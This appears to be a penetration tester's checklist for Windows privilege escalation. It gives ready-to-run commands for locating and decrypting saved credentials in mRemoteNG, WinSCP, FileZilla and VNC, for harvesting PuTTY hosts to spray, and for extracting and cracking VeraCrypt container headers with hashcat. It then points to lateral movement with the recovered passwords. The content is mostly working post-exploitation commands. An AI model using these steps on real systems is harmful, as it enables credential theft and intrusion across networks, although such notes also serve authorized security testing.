# Windows privesc: remote manager credentials

## Before I start
- [ ] A shell on an administrator's workstation or a jump host: their saved sessions are the prize, and :Pb windows-creds covers the rest

## mRemoteNG
dir /s /b C:\Users\*\confCons.xml
On Kali, mRemoteNG-Decrypt, from https://github.com/haseebT/mRemoteNG-Decrypt, with THE-PASSWORD-VALUE a Password="..." value from confCons.xml:
git clone https://github.com/haseebT/mRemoteNG-Decrypt
python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s 'THE-PASSWORD-VALUE'
- [ ] The default master password, mR3m, covers most installs; an error means a custom one, given with -p once I know it
- [ ] Documents, the Desktop and file shares as well: administrators export confCons backups

## WinSCP, FileZilla and PuTTY
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
type %APPDATA%\FileZilla\recentservers.xml
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
- [ ] WinSCP passwords use a reversible cipher, which any public WinSCP password decoder reads
- [ ] FileZilla's are base64, or plain text
- [ ] PuTTY stores no passwords, but every host and username it knows is a list to spray: :Pb spraying

## VNC
reg query "HKLM\SOFTWARE\TightVNC\Server" /v Password
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password
- [ ] Encrypted with a fixed DES key that every VNC password decoder knows; the password is often the same on every host

## VeraCrypt and TrueCrypt containers
Get-ChildItem -Path C:\ -Recurse -Include *.hc,*.tc -ErrorAction SilentlyContinue
On Kali, with the container sent back into loot/ as <File>, and THE-WORDLIST a short list of my own:
dd if=<File> of=vc.hash bs=512 count=1
hashcat -m 13721 vc.hash THE-WORDLIST
- [ ] 13721 is VeraCrypt with SHA-512 and a single cipher; other hashes and cascades have modes of their own, listed by hashcat --help
- [ ] Among hashcat's slowest modes: a very short list, or not at all: :Pb wordlists

## Next
- [ ] Every credential recovered, tried on SMB, WinRM and RDP across the network: :Pb lateral-movement
- [ ] Root credentials for other hosts: :Pb linux-creds once on them
